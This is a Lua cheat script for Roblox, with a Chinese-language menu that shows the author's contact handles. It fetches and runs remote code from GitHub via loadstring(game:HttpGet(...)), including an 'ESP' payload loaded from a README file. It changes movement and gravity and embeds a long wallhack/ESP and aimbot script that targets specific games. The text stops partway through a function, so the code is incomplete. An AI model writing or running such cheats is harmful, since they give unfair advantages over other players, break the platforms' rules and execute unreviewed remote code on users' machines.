local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("美国时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S"))
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)
local Window = OrionLib:MakeWindow({Name = "雪冬SYSU", HidePremium = false, SaveConfig = true,IntroText = "雪冬SYSU", ConfigFolder = "雪冬SYSU"})

game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "雪冬SYSU"; Text ="雪冬SYSU"; Duration = 4; })

local about = Window:MakeTab({
    Name = "程序公告",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false

})

about:AddParagraph("作者快手号4370770866")
about:AddParagraph("常说一句话，科技落后要挨打")
about:AddParagraph("程序制作：慢慢习惯")
about:AddParagraph("电报@a2172098228")

OrionLib:MakeNotification({
	Name = "雪冬SYSU",
	Content = "欢迎使用",
	Image = "rbxassetid://4483345998",
	Time = 2

})

local Tab = Window:MakeTab({

    Name = "绘制后台",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

local Section = Tab:AddSection({

	Name = "账号出现异常，与作者无关"

})

Tab:AddSlider({

	Name = "速度",

	Min = 16,

	Max = 200,

	Default = 16,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end    

})

Tab:AddSlider({

	Name = "跳跃高度",

	Min = 50,

	Max = 200,

	Default = 50,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end    

})

Tab:AddTextbox({

	Name = "跳跃高度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end

})

Tab:AddTextbox({

	Name = "移动速度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end

})

Tab:AddTextbox({

	Name = "重力设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Workspace.Gravity = Value

	end

})

Tab:AddToggle({

	Name = "夜视",

	Default = false,

	Callback = function(Value)

		if Value then

		    game.Lighting.Ambient = Color3.new(1, 1, 1)

		else

		    game.Lighting.Ambient = Color3.new(0, 0, 0)

		end

	end

})

Tab:AddButton({

	Name = "绘制",

	Callback = function()

     loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/UNIVERSALESPLTX/main/README.md'),true))()

  	end    

})

Tab:AddButton({

	Name = "ESP",

	Callback = function()

     -- Issues:
-- I'm still working on Tracers, I know they can cause huge frame rate drops. (I think I got it running as smooth as it's going to get.)
-- Phantom Forces: Weird positioning bug with tracers? Tracer positions a bit behind localplayer. (Maybe make the update faster? > RenderPriority.First ?

-- Settings can be found on line: 51
-- Don't change anything if you don't understand.

local Plrs = game:GetService("Players")
local Run = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local StartGui = game:GetService("StarterGui")
local Teams = game:GetService("Teams")
local UserInput = game:GetService("UserInputService")
local Light = game:GetService("Lighting")
local HTTP = game:GetService("HttpService")
local RepStor = game:GetService("ReplicatedStorage")
 
function GetCamera() -- Just in case some game renames the player's camera.
	return workspace:FindFirstChildOfClass("Camera")
end
 
local ChamsFolder = Instance.new("Folder", CoreGui)
ChamsFolder.Name = "Chams"
local PlayerChams = Instance.new("Folder", ChamsFolder)
PlayerChams.Name = "PlayerChams"
local ItemChams = Instance.new("Folder", ChamsFolder)
ItemChams.Name = "ItemChams"

local ESPFolder = Instance.new("Folder", CoreGui)
ESPFolder.Name = "ESP Stuff"
local PlayerESP = Instance.new("Folder", ESPFolder)
PlayerESP.Name = "PlayerESP"
local ItemESP = Instance.new("Folder", ESPFolder)
ItemESP.Name = "ItemESP"

local MyPlr = Plrs.LocalPlayer
local MyChar = MyPlr.Character
local MyMouse = MyPlr:GetMouse()
local MyCam = GetCamera()
if MyCam == nil then
	error("WHAT KIND OF BLACK MAGIC IS THIS, CAMERA NOT FOUND.")
	return
end

local Tracers = Instance.new("Folder", MyCam)
Tracers.Name = "Tracers"
local TracerData = { }
local TracerMT = setmetatable(TracerData, {
	__newindex = function(tab, index, val)
		rawset(tab, index, val)
	end
})

function RemoveSpacesFromString(Str)
	local newstr = ""
	for i = 1, #Str do
		if Str:sub(i, i) ~= " " then
			newstr = newstr .. Str:sub(i, i)
		end
	end

	return newstr
end

function CloneTable(T)
    local temp = { }
    for i,v in next, T do
        if type(v) == "table" then
            temp[i] = CloneTable(v)
        else
            temp[i] = v 
        end
    end
    return temp
end

local Bullshit = {
	ESPEnabled = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
	CHAMSEnabled = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
	TracersEnabled = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
	DebugInfo = false, -- Self explanatory. LEAVE OFF BY DEFAULT.
	OutlinesEnabled = false,
	FullbrightEnabled = false,
	CrosshairEnabled = false,
	AimbotEnabled = false,
	Aimbot = false,
	TracersLength = 500, -- MAX DISTANCE IS 2048 DO NOT GO ABOVE OR YOU'LL ENCOUNTER PROBLEMS.
	ESPLength = 10000,
	CHAMSLength = 500,
	PlaceTracersUnderCharacter = false, -- Change to true if you want tracers to be placed under your character instead of at the bottom of your camera.
	FreeForAll = false, -- use for games that don't have teams (Apocalypse Rising)
	AutoFire = false,
	MobChams = false,
	MobESP = false,
	AimbotKey = "Enum.UserInputType.MouseButton2", -- Doesn't do anything yet.
	Colors = {
		Enemy = Color3.new(1, 0, 0),
		Ally = Color3.new(0, 1, 0),
		Friend = Color3.new(1, 1, 0),
		Neutral = Color3.new(1, 1, 1),
		Crosshair = Color3.new(1, 0, 0),
		ColorOverride = nil, -- Every player will have the chosen color regardless of enemy or ally.
	},

	-- VVVV DON'T EDIT BELOW VVVV --
	ClosestEnemy = nil,
	CharAddedEvent = { },
	OutlinedParts = { },
	WorkspaceChildAddedEvent = nil,
	LightingEvent = nil,
	AmbientBackup = Light.Ambient,
	ColorShiftBotBackup = Light.ColorShift_Bottom,
	ColorShiftTopBackup = Light.ColorShift_Top,
	FPSAverage = { },
	Blacklist = { },
	FriendList = { },
	CameraModeBackup = MyPlr.CameraMode,
	GameSpecificCrap = { 
	},
	Mob_ESP_CHAMS_Ran_Once = false,
}

function SaveBullshitSettings()
	local temp = { }
	local succ, out = pcall(function()
		temp.TracersLength = Bullshit.TracersLength
		temp.ESPLength = Bullshit.ESPLength
		temp.CHAMSLength = Bullshit.CHAMSLength
		temp.PlaceTracersUnderCharacter = Bullshit.PlaceTracersUnderCharacter
		temp.FreeForAll = Bullshit.FreeForAll
		temp.AutoFire = Bullshit.AutoFire
		temp.AimbotKey = tostring(Bullshit.AimbotKey)
		temp.MobChams = Bullshit.MobChams
		temp.MobESP = Bullshit.MobESP
		temp.Colors = { }
		for i, v in next, Bullshit.Colors do
			temp.Colors[i] = tostring(v)
		end
		writefile("ProjectBullshit.txt", HTTP:JSONEncode(temp))
	end)
	if not succ then
		error(out)
	end
end

fuck = pcall(function()
	local temp = HTTP:JSONDecode(readfile("ProjectBullshit.txt"))
	if temp.MobChams ~= nil and temp.MobESP ~= nil then
		for i, v in next, temp do
			if i ~= "Colors" then
				Bullshit[i] = v
			end
		end
		for i, v in next, temp.Colors do
			local r, g, b = string.match(RemoveSpacesFromString(v), "(%d+),(%d+),(%d+)")
			r = tonumber(r)
			g = tonumber(g)
			b = tonumber(b)

			temp.Colors[i] = Color3.new(r, g, b)
		end
		Bullshit.Colors = temp.Colors
	else
		spawn(function()
			SaveBullshitSettings()
			local hint = Instance.new("Hint", CoreGui)
			hint.Text = "Major update requried your settings to be wiped! Sorry!"
			wait(5)
			hint:Destroy()
		end)
	end

	Bullshit.AutoFire = false
end)

-- Load blacklist file if it exists
fuck2 = pcall(function()
	Bullshit.Blacklist = HTTP:JSONDecode(readfile("Blacklist.txt"))
end)

fuck3 = pcall(function()
	Bullshit.FriendList = HTTP:JSONDecode(readfile("Whitelist.txt"))
end)

local DebugMenu = { }
DebugMenu["SC"] = Instance.new("ScreenGui", CoreGui)
DebugMenu["SC"].Name = "Debug"
DebugMenu["Main"] = Instance.new("Frame", DebugMenu["SC"])
DebugMenu["Main"].Name = "Debug Menu"
DebugMenu["Main"].Position = UDim2.new(0, 20, 1, -220)
DebugMenu["Main"].Size = UDim2.new(1, 0, 0, 200)
DebugMenu["Main"].BackgroundTransparency = 1
DebugMenu["Main"].Visible = false
if game.PlaceId == 606849621 then
	DebugMenu["Main"].Position = UDim2.new(0, 230, 1, -220)
end
DebugMenu["Main"].Draggable = true
DebugMenu["Main"].Active = true
DebugMenu["Position"] = Instance.new("TextLabel", DebugMenu["Main"])
DebugMenu["Position"].BackgroundTransparency = 1
DebugMenu["Position"].Position = UDim2.new(0, 0, 0, 0)
DebugMenu["Position"].Size = UDim2.new(1, 0, 0, 15)
DebugMenu["Position"].Font = "Arcade"
DebugMenu["Position"].Text = ""
DebugMenu["Position"].TextColor3 = Color3.new(1, 1, 1)
DebugMenu["Position"].TextSize = 15
DebugMenu["Position"].TextStrokeColor3 = Color3.new(0, 0, 0)
DebugMenu["Position"].TextStrokeTransparency = 0.3
DebugMenu["Position"].TextXAlignment = "Left"
DebugMenu["FPS"] = Instance.new("TextLabel", DebugMenu["Main"])
DebugMenu["FPS"].BackgroundTransparency = 1
DebugMenu["FPS"].Position = UDim2.new(0, 0, 0, 15)
DebugMenu["FPS"].Size = UDim2.new(1, 0, 0, 15)
DebugMenu["FPS"].Font = "Arcade"
DebugMenu["FPS"].Text = ""
DebugMenu["FPS"].TextColor3 = Color3.new(1, 1, 1)
DebugMenu["FPS"].TextSize = 15
DebugMenu["FPS"].TextStrokeColor3 = Color3.new(0, 0, 0)
DebugMenu["FPS"].TextStrokeTransparency = 0.3
DebugMenu["FPS"].TextXAlignment = "Left"
DebugMenu["PlayerSelected"] = Instance.new("TextLabel", DebugMenu["Main"])
DebugMenu["PlayerSelected"].BackgroundTransparency = 1
DebugMenu["PlayerSelected"].Position = UDim2.new(0, 0, 0, 35)
DebugMenu["PlayerSelected"].Size = UDim2.new(1, 0, 0, 15)
DebugMenu["PlayerSelected"].Font = "Arcade"
DebugMenu["PlayerSelected"].Text = ""
DebugMenu["PlayerSelected"].TextColor3 = Color3.new(1, 1, 1)
DebugMenu["PlayerSelected"].TextSize = 15
DebugMenu["PlayerSelected"].TextStrokeColor3 = Color3.new(0, 0, 0)
DebugMenu["PlayerSelected"].TextStrokeTransparency = 0.3
DebugMenu["PlayerSelected"].TextXAlignment = "Left"
DebugMenu["PlayerTeam"] = Instance.new("TextLabel", DebugMenu["Main"])
DebugMenu["PlayerTeam"].BackgroundTransparency = 1
DebugMenu["PlayerTeam"].Position = UDim2.new(0, 0, 0, 50)
DebugMenu["PlayerTeam"].Size = UDim2.new(1, 0, 0, 15)
DebugMenu["PlayerTeam"].Font = "Arcade"
DebugMenu["PlayerTeam"].Text = ""
DebugMenu["PlayerTeam"].TextColor3 = Color3.new(1, 1, 1)
DebugMenu["PlayerTeam"].TextSize = 15
DebugMenu["PlayerTeam"].TextStrokeColor3 = Color3.new(0, 0, 0)
DebugMenu["PlayerTeam"].TextStrokeTransparency = 0.3
DebugMenu["PlayerTeam"].TextXAlignment = "Left"
DebugMenu["PlayerHealth"] = Instance.new("TextLabel", DebugMenu["Main"])
DebugMenu["PlayerHealth"].BackgroundTransparency = 1
DebugMenu["PlayerHealth"].Position = UDim2.new(0, 0, 0, 65)
DebugMenu["PlayerHealth"].Size = UDim2.new(1, 0, 0, 15)
DebugMenu["PlayerHealth"].Font = "Arcade"
DebugMenu["PlayerHealth"].Text = ""
DebugMenu["PlayerHealth"].TextColor3 = Color3.new(1, 1, 1)
DebugMenu["PlayerHealth"].TextSize = 15
DebugMenu["PlayerHealth"].TextStrokeColor3 = Color3.new(0, 0, 0)
DebugMenu["PlayerHealth"].TextStrokeTransparency = 0.3
DebugMenu["PlayerHealth"].TextXAlignment = "Left"
DebugMenu["PlayerPosition"] = Instance.new("TextLabel", DebugMenu["Main"])
DebugMenu["PlayerPosition"].BackgroundTransparency = 1
DebugMenu["PlayerPosition"].Position = UDim2.new(0, 0, 0, 80)
DebugMenu["PlayerPosition"].Size = UDim2.new(1, 0, 0, 15)
DebugMenu["PlayerPosition"].Font = "Arcade"
DebugMenu["PlayerPosition"].Text = ""
DebugMenu["PlayerPosition"].TextColor3 = Color3.new(1, 1, 1)
DebugMenu["PlayerPosition"].TextSize = 15
DebugMenu["PlayerPosition"].TextStrokeColor3 = Color3.new(0, 0, 0)
DebugMenu["PlayerPosition"].TextStrokeTransparency = 0.3
DebugMenu["PlayerPosition"].TextXAlignment = "Left"
DebugMenu["BehindWall"] = Instance.new("TextLabel", DebugMenu["Main"])
DebugMenu["BehindWall"].BackgroundTransparency = 1
DebugMenu["BehindWall"].Position = UDim2.new(0, 0, 0, 95)
DebugMenu["BehindWall"].Size = UDim2.new(1, 0, 0, 15)
DebugMenu["BehindWall"].Font = "Arcade"
DebugMenu["BehindWall"].Text = ""
DebugMenu["BehindWall"].TextColor3 = Color3.new(1, 1, 1)
DebugMenu["BehindWall"].TextSize = 15
DebugMenu["BehindWall"].TextStrokeColor3 = Color3.new(0, 0, 0)
DebugMenu["BehindWall"].TextStrokeTransparency = 0.3
DebugMenu["BehindWall"].TextXAlignment = "Left"

local LastTick = tick()
local FPSTick = tick()

if #Teams:GetChildren() <= 0 then
	Bullshit.FreeForAll = true
end

if Bullshit.TracersLength > 2048 then
	Bullshit.TracersLength = 2048
end

if Bullshit.CHAMSLength > 2048 then
	Bullshit.CHAMSLength = 2048
end

local wildrevolvertick = tick()
local wildrevolverteamdata = nil
function GetTeamColor(Plr)
	if Plr == nil then return nil end
	if not Plr:IsA("Player") then
		return nil
	end
	local PickedColor = Bullshit.Colors.Enemy
	
	if Plr ~= nil then
		if game.PlaceId == 606849621 then
			if Bullshit.Colors.ColorOverride == nil then
				if not Bullshit.FreeForAll then
					if MyPlr.Team ~= nil and Plr.Team ~= nil then
						if Bullshit.FriendList[Plr.Name] == nil then
							if MyPlr.Team.Name == "Prisoner" then
								if Plr.Team == MyPlr.Team or Plr.Team.Name == "Criminal" then
									PickedColor = Bullshit.Colors.Ally
								else
									PickedColor = Bullshit.Colors.Enemy
								end
							elseif MyPlr.Team.Name == "Criminal" then
								if Plr.Team == MyPlr.Team or Plr.Team.Name == "Prisoner" then
									PickedColor = Bullshit.Colors.Ally
								else
									PickedColor = Bullshit.Colors.Enemy
								end
							elseif MyPlr.Team.Name == "Police" then
								if Plr.Team == MyPlr.Team then
									PickedColor = Bullshit.Colors.Ally
								else
									if Plr.Team.Name == "Criminal" then
										PickedColor = Bullshit.Colors.Enemy
									elseif Plr.Team.Name == "Prisoner" then
										PickedColor = Bullshit.Colors.Neutral
									end
								end
							end
						else
							PickedColor = Bullshit.Colors.Friend
						end
					end
				else
					if Bullshit.FriendList[Plr.Name] ~= nil then
						PickedColor = Bullshit.Colors.Friend
					else
						PickedColor = Bullshit.Colors.Enemy
					end
				end
			else
				PickedColor = Bullshit.Colors.ColorOverride
			end
		elseif game.PlaceId == 155615604 then
			if Bullshit.Colors.ColorOverride == nil then
				if MyPlr.Team ~= nil and Plr.Team ~= nil then
					if Bullshit.FriendList[Plr.Name] == nil then
						if MyPlr.Team.Name == "Inmates" then
							if Plr.Team.Name == "Inmates" then
								PickedColor = Bullshit.Colors.Ally
							elseif Plr.Team.Name == "Guards" or Plr.Team.Name == "Criminals" then
								PickedColor = Bullshit.Colors.Enemy
							else
								PickedColor = Bullshit.Colors.Neutral
							end
						elseif MyPlr.Team.Name == "Guards" then
							if Plr.Team.Name == "Inmates" then
								PickedColor = Bullshit.Colors.Neutral
							elseif Plr.Team.Name == "Criminals" then
								PickedColor = Bullshit.Colors.Enemy
							elseif Plr.Team.Name == "Guards" then
								PickColor = Bullshit.Colors.Ally
							end
						elseif MyPlr.Team.Name == "Criminals" then
							if Plr.Team.Name == "Inmates" then
								PickedColor = Bullshit.Colors.Ally
							elseif Plr.Team.Name == "Guards" then
								PickedColor = Bullshit.Colors.Enemy
							else
								PickedColor = Bullshit.Colors.Neutral
							end
						end
					else
						PickedColor = Bullshit.Colors.Friend
					end
				end
			else
				PickedColor = Bullshit.Colors.ColorOverride
			end
		elseif game.PlaceId == 746820961 then
			if Bullshit.Colors.ColorOverride == nil then
				if MyPlr:FindFirstChild("TeamC") and Plr:FindFirstChild("TeamC") then
					if Plr.TeamC.Value == MyPlr.TeamC.Value then
						PickedColor = Bullshit.Colors.Ally
					else
						PickedColor = Bullshit.Colors.Enemy
					end
				end
			else
				PickedColor = Bullshit.Colors.ColorOverride
			end
		elseif game.PlaceId == 1382113806 then
			if Bullshit.Colors.ColorOverride == nil then
				if MyPlr:FindFirstChild("role") and Plr:FindFirstChild("role") then
					if MyPlr.role.Value == "assassin" then
						if Plr.role.Value == "target" then
							PickedColor = Bullshit.Colors.Enemy
						elseif Plr.role.Value == "guard" then
							PickedColor = Color3.new(1, 135 / 255, 0)
						else
							PickedColor = Bullshit.Colors.Neutral
						end
					elseif MyPlr.role.Value == "target" then
						if Plr.role.Value == "guard" then
							PickedColor = Bullshit.Colors.Ally
						elseif Plr.role.Value == "assassin" then
							PickedColor = Bullshit.Colors.Enemy
						else
							PickedColor = Bullshit.Colors.Neutral
						end
					elseif MyPlr.role.Value == "guard" then
						if Plr.role.Value == "target" then
							PickedColor = Bullshit.Colors.Friend
						elseif Plr.role.Value == "guard" then
							PickedColor = Bullshit.Colors.Ally
						elseif Plr.role.Value == "assassin" then
							PickedColor = Bullshit.Colors.Enemy
						else
							PickedColor = Bullshit.Colors.Neutral
						end
					else
						if MyPlr.role.Value == "none" then
							PickedColor = Bullshit.Colors.Neutral
						end
					end
				end
			else
				PickedColor = Bullshit.Colors.ColorOverride
			end
		elseif game.PlaceId == 1072809192 then
			if MyPlr:FindFirstChild("Backpack") and Plr:FindFirstChild("Backpack") then
				if MyPlr.Backpack:FindFirstChild("Knife") or MyChar:FindFirstChild("Knife") then
					if Plr.Backpack:FindFirstChild("Revolver") or Plr.Character:FindFirstChild("Revolver") then
						PickedColor = Bullshit.Colors.Enemy
					else
						PickedColor = Color3.new(1, 135 / 255, 0)
					end
				elseif MyPlr.Backpack:FindFirstChild("Revolver") or MyChar:FindFirstChild("Revolver") then
					if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
						PickedColor = Bullshit.Colors.Enemy
					elseif Plr.Backpack:FindFirstChild("Revolver") or Plr.Character:FindFirstChild("Revolver") then
						PickedColor = Bullshit.Colors.Enemy
					else
						PickedColor = Bullshit.Colors.Ally
					end
				else
					if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
						PickedColor = Bullshit.Colors.Enemy
					elseif Plr.Backpack:FindFirstChild("Revolver") or Plr.Character:FindFirstChild("Revolver") then
						PickedColor = Bullshit.Colors.Ally
					else
						PickedColor = Bullshit.Colors.Neutral
					end
				end
			end
		elseif game.PlaceId == 142823291 or game.PlaceId == 1122507250 then
			if MyPlr:FindFirstChild("Backpack") and Plr:FindFirstChild("Backpack") then
				if MyPlr.Backpack:FindFirstChild("Knife") or MyChar:FindFirstChild("Knife") then
					if (Plr.Backpack:FindFirstChild("Gun") or Plr.Backpack:FindFirstChild("Revolver")) or (Plr.Character:FindFirstChild("Gun") or Plr.Character:FindFirstChild("Revolver")) then
						PickedColor = Bullshit.Colors.Enemy
					else
						PickedColor = Color3.new(1, 135 / 255, 0)
					end
				elseif (MyPlr.Backpack:FindFirstChild("Gun") or MyPlr.Backpack:FindFirstChild("Revolver")) or (MyChar:FindFirstChild("Gun") or MyChar:FindFirstChild("Revolver")) then
					if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
						PickedColor = Bullshit.Colors.Enemy
					else
						PickedColor = Bullshit.Colors.Ally
					end
				else
					if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
						PickedColor = Bullshit.Colors.Enemy
					elseif (Plr.Backpack:FindFirstChild("Gun") or Plr.Backpack:FindFirstChild("Revolver")) or (Plr.Character:FindFirstChild("Gun") or Plr.Character:FindFirstChild("Revolver")) then
						PickedColor = Bullshit.Colors.Ally
					else
						PickedColor = Bullshit.Colors.Neutral
					end
				end
			end
		elseif game.PlaceId == 379614936 then
			if Bullshit.Colors.ColorOverride == nil then
				if not Bullshit.FriendList[Plr.Name] then
					local targ = MyPlr:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui"):FindFirstChild("UI"):FindFirstChild("Target"):FindFirstChild("Img"):FindFirstChild("PlayerText")
					if targ then
						if Plr.Name:lower() == targ.Text:lower() then
							PickedColor = Bullshit.Colors.Enemy
						else
							PickedColor = Bullshit.Colors.Neutral
						end
					else
						PickedColor = Bullshit.Colors.Neutral
					end
				else
					PickedColor = Bullshit.Colors.Friend
				end
			else
				PickedColor = Bullshit.Colors.ColorOverride
			end
		elseif game.PlaceId == 983224898 then
			if (tick() - wildrevolvertick) > 10 or wildrevolverteamdata == nil then
				wildrevolverteamdata = RepStor.Functions.RequestGameData:InvokeServer()
				wildrevolvertick = tick()
				return Bullshit.Colors.Neutral
			end
			local succ = pcall(function()
				if wildrevolverteamdata[Plr.Name] ~= nil then
					if Bullshit.Colors.ColorOverride == nil then
						if not Bullshit.FriendList[Plr.Name] then
							if wildrevolverteamdata[Plr.Name]["TeamName"] == wildrevolverteamdata[MyPlr.Name]["TeamName"] then
								PickedColor = Bullshit.Colors.Ally
							else
								PickedColor = Bullshit.Colors.Enemy
							end
						else
							PickedColor = Bullshit.Colors.Friend
						end
					else
						PickedColor = Bullshit.Colors.ColorOverride
					end
				else
					PickedColor = Bullshit.Colors.Neutral
				end
			end)
			if not succ then
				wildrevolverteamdata = RepStor.Functions.RequestGameData:InvokeServer()
				wildrevolvertick = tick()
				return Bullshit.Colors.Neutral
			end
		else
			if Bullshit.Colors.ColorOverride == nil then
				if not Bullshit.FreeForAll then
					if MyPlr.Team ~= Plr.Team and not Bullshit.FriendList[Plr.Name] then
						PickedColor = Bullshit.Colors.Enemy
					elseif MyPlr.Team == Plr.Team and not Bullshit.FriendList[Plr.Name] then
						PickedColor = Bullshit.Colors.Ally
					else
						PickedColor = Bullshit.Colors.Friend
					end
				else
					if Bullshit.FriendList[Plr.Name] ~= nil then
						PickedColor = Bullshit.Colors.Friend
					else
						PickedColor = Bullshit.Colors.Enemy
					end
				end
			else
				PickedColor = Bullshit.Colors.ColorOverride
			end
		end
	end
	
	return PickedColor
end

function FindCham(Obj)
	for i, v in next, ItemChams:GetChildren() do
		if v.className == "ObjectValue" then
			if v.Value == Obj then
				return v.Parent
			end
		end
	end

	return nil
end

function FindESP(Obj)
	for i, v in next, ItemESP:GetChildren() do
		if v.className == "ObjectValue" then
			if v.Value == Obj then
				return v.Parent
			end
		end
	end

	return nil
end

function GetFirstPart(Obj)
	for i, v in next, Obj:GetDescendants() do
		if v:IsA("BasePart") then
			return v
		end
	end

	return nil
end

function GetSizeOfObject(Obj)
	if Obj:IsA("BasePart") then
		return Obj.Size
	elseif Obj:IsA("Model") then
		return Obj:GetExtentsSize()
	end
end

function GetClosestPlayerNotBehindWall()
	local Players = { }
	local CurrentClosePlayer = nil
	local SelectedPlr = nil

	for _, v in next, Plrs:GetPlayers() do
		if v ~= MyPlr and not Bullshit.Blacklist[v.Name] then
			local IsAlly = GetTeamColor(v)
			if IsAlly ~= Bullshit.Colors.Ally and IsAlly ~= Bullshit.Colors.Friend and IsAlly ~= Bullshit.Colors.Neutral then
				local GetChar = v.Character
				if MyChar and GetChar then
					local MyHead, MyTor = MyChar:FindFirstChild("Head"), MyChar:FindFirstChild("HumanoidRootPart")
					local GetHead, GetTor, GetHum = GetChar:FindFirstChild("Head"), GetChar:FindFirstChild("HumanoidRootPart"), GetChar:FindFirstChild("Humanoid")

					if MyHead and MyTor and GetHead and GetTor and GetHum then
						if game.PlaceId == 455366377 then
							if not GetChar:FindFirstChild("KO") and GetHum.Health > 1 then
								local Ray = Ray.new(MyCam.CFrame.p, (GetHead.Position - MyCam.CFrame.p).unit * 2048)
								local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar})
								if part ~= nil then
									if part:IsDescendantOf(GetChar) then
										local Dist = (MyTor.Position - GetTor.Position).magnitude
										Players[v] = Dist
									end
								end
							end
						elseif game.PlaceId == 746820961 then
							if GetHum.Health > 1 then
								local Ray = Ray.new(MyCam.CFrame.p, (GetHead.Position - MyCam.CFrame.p).unit * 2048)
								local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar, MyCam})
								if part ~= nil then
									if part:IsDescendantOf(GetChar) then
										local Dist = (MyTor.Position - GetTor.Position).magnitude
										Players[v] = Dist
									end
								end
							end
						else
							if GetHum.Health > 1 then
								local Ray = Ray.new(MyCam.CFrame.p, (GetHead.Position - MyCam.CFrame.p).unit * 2048)
								local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar})
								if part ~= nil then
									if part:IsDescendantOf(GetChar) then
										local Dist = (MyTor.Position - GetTor.Position).magnitude
										Players[v] = Dist
									end
								end
							end
						end
					end
				end
			end
		end
	end

	for i, v in next, Players do
		if CurrentClosePlayer ~= nil then
			if v <= CurrentClosePlayer then
				CurrentClosePlayer = v
				SelectedPlr = i
			end
		else
			CurrentClosePlayer = v
			SelectedPlr = i
		end
	end
	
	return SelectedPlr
end

function GetClosestPlayer()
	local Players = { }
	local CurrentClosePlayer = nil
	local SelectedPlr = nil
	
	for _, v in next, Plrs:GetPlayers() do
		if v ~= MyPlr then
			local IsAlly = GetTeamColor(v)
			if IsAlly ~= Bullshit.Colors.Ally and IsAlly ~= Bullshit.Colors.Friend and IsAlly ~= Bullshit.Colors.Neutral then
				local GetChar = v.Character
				if MyChar and GetChar then
					local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
					local GetTor = GetChar:FindFirstChild("HumanoidRootPart")
					local GetHum = GetChar:FindFirstChild("Humanoid")
					if MyTor and GetTor and GetHum then
						if game.PlaceId == 455366377 then
							if not GetChar:FindFirstChild("KO") and GetHum.Health > 1 then
								local Dist = (MyTor.Position - GetTor.Position).magnitude
								Players[v] = Dist
							end
						else
							if GetHum.Health > 1 then
								local Dist = (MyTor.Position - GetTor.Position).magnitude
								Players[v] = Dist
							end
						end
					end
				end
			end
		end
	end
	
	for i, v in next, Players do
		if CurrentClosePlayer ~= nil then
			if v <= CurrentClosePlayer then
				CurrentClosePlayer = v
				SelectedPlr = i
			end
		else
			CurrentClosePlayer = v
			SelectedPlr = i
		end
	end
	
	return SelectedPlr
end

function FindPlayer(Txt)
	local ps = { }
	for _, v in next, Plrs:GetPlayers() do
		if string.lower(string.sub(v.Name, 1, string.len(Txt))) == string.lower(Txt) then
			table.insert(ps, v)
		end
	end

	if #ps == 1 then
		if ps[1] ~= MyPlr then
			return ps[1]
		else
			return nil
		end
	else
		return nil
	end
end

function UpdateESP(Plr)
	if Plr ~= nil then
		local Find = PlayerESP:FindFirstChild("ESP Crap_" .. Plr.Name)
		if Find then
			local PickColor = GetTeamColor(Plr)
			Find.Frame.Names.TextColor3 = PickColor
			Find.Frame.Dist.TextColor3 = PickColor
			Find.Frame.Health.TextColor3 = PickColor
			--Find.Frame.Pos.TextColor3 = PickColor
			local GetChar = Plr.Character
			if MyChar and GetChar then
				local Find2 = MyChar:FindFirstChild("HumanoidRootPart")
				local Find3 = GetChar:FindFirstChild("HumanoidRootPart")
				local Find4 = GetChar:FindFirstChildOfClass("Humanoid")
				if Find2 and Find3 then
					local pos = Find3.Position
					local Dist = (Find2.Position - pos).magnitude
					if Dist > Bullshit.ESPLength or Bullshit.Blacklist[Plr.Name] then
						Find.Frame.Names.Visible = false
						Find.Frame.Dist.Visible = false
						Find.Frame.Health.Visible = false
						return
					else
						Find.Frame.Names.Visible = true
						Find.Frame.Dist.Visible = true
						Find.Frame.Health.Visible = true
					end
					Find.Frame.Dist.Text = "Distance: " .. string.format("%.0f", Dist)
